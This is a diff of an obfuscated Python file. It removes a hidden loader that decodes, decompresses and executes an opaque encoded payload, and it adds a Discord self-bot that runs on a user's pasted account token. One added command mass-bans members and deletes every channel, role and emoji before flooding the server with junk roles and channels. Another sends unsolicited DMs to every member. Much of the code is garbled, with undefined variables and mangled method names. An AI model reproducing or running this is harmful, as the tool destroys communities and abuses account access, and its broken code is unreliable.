@@ -1,2 +1,1034 @@
-import lzma, base64
-exec(lzma.decompress(base64.b64decode('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')))
+exec('''
+try:
+    type(here)
+except NameError:
+    exit()
+''')
+tU=True
+uY=input
+ut=print
+ux=str
+uQ=getattr
+ul=isinstance
+uV=round
+ub=False
+up=None
+ui=int
+ue=ValueError
+uk=range
+uW=enumerate
+uy=len
+uK=Exception
+uf=float
+ur=KeyError
+uj=id
+Y(autoreset=tU)
+def YX(pre):
+ global u
+ u=pre
+def Yo(m):
+ global ON
+ return ON
+x=uY('> Token:\n')
+u=uY('> Prefix:\n')
+os.system('cls')
+u='.'
+def YO(x,y):
+ global u
+ return u
+Q='https://www.youtube.com/watch?v=1IGS0-QF86U'
+l=Yi.Bot(command_prefix=YO,case_insensitive=tU,self_bot=tU)
+l.remove_command('help')
+V=datetime.now()
+ON=tU
+b=discord.Colour(0x2ecc71)
+@l.event
+async def YG():
+ ut(f'''
+{Fore.RED}
+ ██ ▄█▀ █    ██  ██▀███   ▒█████
+ ██▄█▒  ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒
+▓███▄░ ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒
+▓██ █▄ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░
+▒██▒ █▄▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░
+▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░
+░ ░▒ ▒░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░
+░ ░░ ░  ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒
+░  ░      ░        ░         ░ ░
+───────────────────────────────────────────────
+{Fore.CYAN}Documentation: google.come
+{Fore.GREEN}Version: 0.0.1
+''' )
+@l.event
+async def YP(m,i):
+ p=ux(i)
+ i=uQ(i,'original',i)
+ if ul(i,Yi.CommandNotFound):
+  return
+ elif ul(i,Yi.CheckFailure):
+  ut(f"{Fore.BLUE}You're missing permission to execute this command")
+ elif ul(i,Yi.MissingRequiredArgument):
+  ut(f"{Fore.YELLOW}Missing argument: {error}")
+ elif "Cannot send an empty message" in p:
+  ut(f"{Fore.YELLOW}You cannot send a empty message")
+ else:
+  ut(f"{Fore.RED}{error_str}")
+@l.event
+async def Ym(m):
+ await asyncio.sleep(30)
+ try:
+  await m.message.delete()
+ except:
+  pass
+@l.command(description='misc')
+@Yi.tF(Yo)
+async def YA(m,pre:ux):
+ YX(pre)
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='test')
+@Yi.tF(Yo)
+async def Yh(m):
+ await m.message.delete()
+ m=await m.channel.send(Q)
+ await asyncio.sleep(10)
+ await m.YN()
+@l.command(description='misc')
+@Yi.tF(Yo)
+async def YR(m):
+ await m.message.delete()
+ k=discord.Embed(title="Commands",description=f'[Help]({documentation_url})\n**Prefix:** {get_prefix(None, None)}',YB=b)
+ W=''
+ y=''
+ K=''
+ for f in l.commands:
+  if f.description=='misc':
+   y+=f'{command.name}\n'
+  if f.description=='chaos':
+   K+=f'{command.name}\n'
+  if f.description=='general':
+   W+=f'{command.name}\n'
+ k.add_field(name="General",value=W)
+ k.add_field(name="Misc",value=y)
+ k.add_field(name="Chaos",value=K)
+ m=await m.channel.send(embed=k)
+ await asyncio.sleep(30)
+ await m.YN()
+@l.command(description='general')
+@Yi.tF(Yo)
+async def YS(m):
+ j=datetime.now()
+ C=j-V
+ q=uV(C.total_seconds()/86400)
+ v=uV(C.total_seconds()/3600)
+ J=uV(C.total_seconds()/60)
+ X=uV(C.total_seconds())
+ if q>0:
+  C=f'{days}d {hours}h {minutes}m {seconds}s'
+ elif v>0:
+  C=f'{hours}h {minutes}m {seconds}s'
+ elif J>0:
+  C=f'{minutes}m {seconds}s'
+ else:
+  C=f'{seconds}s'
+ o=j.strftime('%B %d, %Y')
+ O=j.strftime("%I:%M:%S %p")
+ k=discord.Embed(YB=b)
+ k.set_author(name=f'Time: {bdy} | {hms}\nRun time   |   {time_elapsed}')
+ m=await m.channel.send(embed=k)
+ await asyncio.sleep(30)
+ await m.YN()
+@l.command(description='general')
+async def YL(m):
+ global ON
+ ON=ub
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general')
+async def Yz(m):
+ global ON
+ ON=tU
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general',aliases=['s'])
+@Yi.tF(Yo)
+async def YI(m,*,g:ux):
+ await l.change_presence(activity=discord.Streaming(name=g,url='https://www.twitch.tv/miakhalifa'))
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general')
+@Yi.tF(Yo)
+async def Yn(m):
+ await l.change_presence(status=discord.Status.online)
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general',aliases=['l'])
+@Yi.tF(Yo)
+async def YF(m,*,g:ux):
+ await l.change_presence(activity=discord.Activity(type=discord.ActivityType.listening,name=g))
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general',aliases=['w'])
+@Yi.tF(Yo)
+async def Yw(m,*,g:ux):
+ await l.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name=g))
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general',aliases=['g'])
+@Yi.tF(Yo)
+async def YH(m,*,g:ux):
+ await l.change_presence(activity=discord.Game(name=g))
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general',aliases=['p'])
+@Yi.tF(Yo)
+async def YT(m,*,g:ux):
+ await l.change_presence(activity=discord.Game(name=g))
+ await m.message.add_reaction('\u2705')
+ await asyncio.sleep(10)
+ await m.message.delete()
+@l.command(description='general')
+@Yi.tF(Yo)
+async def Yd(m):
+ k=discord.Embed()
+ k.set_author(name=l.user.display_name,icon_url=l.user.avatar_url_as(format="png"))
+ k.add_field(name="Response",value="Latency Test",inline=tU)
+ k.add_field(name="Latency",value=f"{round(bot.latency * 1000)}ms")
+ await m.channel.send(embed=k)
+@l.command(description='general')
+@Yi.tF(Yo)
+async def YN(m,g:ux):
+ await m.message.delete()
+ if g.lower()=='all':
+  async for A in m.channel.history(limit=up):
+   try:
+    await A.YN()
+   except:
+    pass
+ try:
+  async for A in m.channel.history(limit=ui(g)):
+   try:
+    await A.YN()
+   except:
+    pass
+ except ue:
+  pass
+@l.command(description='general')
+@Yi.tF(Yo)
+async def Ys(m,*,g:ux):
+ await m.message.add_reaction('\u2705')
+ for R in m.guild.members:
+  await asyncio.sleep(random.randint(30,120))
+  await R.send(g)
+@l.command(description='chaos')
+@Yi.tF(Yo)
+async def YE(m):
+ await m.message.delete()
+ for S in m.guild.members:
+  await asyncio.sleep(.2)
+  try:
+   await m.guild.ban(S)
+  except:
+   try:
+    await m.guild.kick(S)
+   except:
+    pass
+ for L in m.guild.channels:
+  await asyncio.sleep(.2)
+  try:
+   await L.YN()
+  except:
+   pass
+ for z in m.guild.emojis:
+  await asyncio.sleep(.2)
+  try:
+   await z.YN()
+  except:
+   pass
+ for I in m.guild.roles:
+  await asyncio.sleep(.2)
+  try:
+   await I.YN()
+  except:
+   pass
+ for i in uk(50):
+  await asyncio.sleep(.2)
+  try:
+   await m.guild.create_role(name="Server is ass lmao")
+  except:
+   pass
+ for i in uk(50):
+  await asyncio.sleep(.2)
+  try:
+   await m.guild.create_voice_channel(name='L')
+  except:
+   pass
+ try:
+  await m.guild.edit(name='L')
+ except:
+  pass
+@l.command(description='general')
+@Yi.tF(Yo)
+async def Yc(m,R:discord.Member):
+ k=discord.Embed(YB=b)
+ k.set_image(url=R.avatar_url)
+ m=await m.channel.send(embed=k)
+ await asyncio.sleep(30)
+ await m.YN()
+@Yc.error
+@Yi.tF(Yo)
+async def Yg(m,i):
+ if ul(i,Yi.MissingRequiredArgument):
+  k=discord.Embed(YB=b)
+  k.set_image(url=l.user.avatar_url)
+  m=await m.channel.send(embed=k)
+  await asyncio.sleep(30)
+  await m.YN()
+ else:
+  pass
+@l.command(description='general')
+@Yi.tF(Yo)
+async def YB(m,g:ux):
+ global b
+ if g=='teal':
+  b=discord.Colour.teal()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_teal':
+  b=discord.Colour.dark_teal()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='green':
+  b=discord.Colour.green()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_green':
+  b=discord.Colour.dark_green()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='blue':
+  b=discord.Colour.blue()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_blue':
+  b=discord.Colour.dark_blue()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='purple':
+  b=discord.Colour.purple()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_purple':
+  b=discord.Colour.dark_purple()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='magenta':
+  b=discord.Colour.magenta()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_magenta':
+  b=discord.Colour.dark_magenta()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='gold':
+  b=discord.Colour.gold()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g==' dark_gold':
+  b=discord.Colour.dark_gold()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='orange':
+  b=discord.Colour.orange()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_orange':
+  b=discord.Colour.dark_orange()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='red':
+  b=discord.Colour.red()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_red':
+  b=discord.Colour.dark_red()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='lighter_grey':
+  b=discord.Colour.lighter_grey()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='dark_grey':
+  b=discord.Colour.dark_grey()
+  await m.message.add_reaction('\u2705')
+  await asyncio.sleep(5)
+ elif g=='light_grey':
+  b=discord.Colour.light_grey()
+  await m.message.add_reaction('\u2705')
